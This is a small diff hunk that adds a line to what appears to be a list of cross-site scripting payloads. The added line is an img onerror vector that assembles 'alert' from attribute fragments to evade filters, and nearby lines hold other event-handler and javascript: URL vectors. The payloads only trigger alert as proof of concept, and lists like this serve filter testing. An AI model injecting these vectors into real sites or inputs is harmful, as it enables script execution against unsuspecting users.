@@ -7,6 +7,7 @@ self
 parent
 windiow
 
+<img src=1 a=al c=ert onerror=top[a%2bc](0)>
 <details open ontoggle=top['al'%2B'ert'](1) >
 
 <img src=1 onerror=location="javascript:alert(1)">
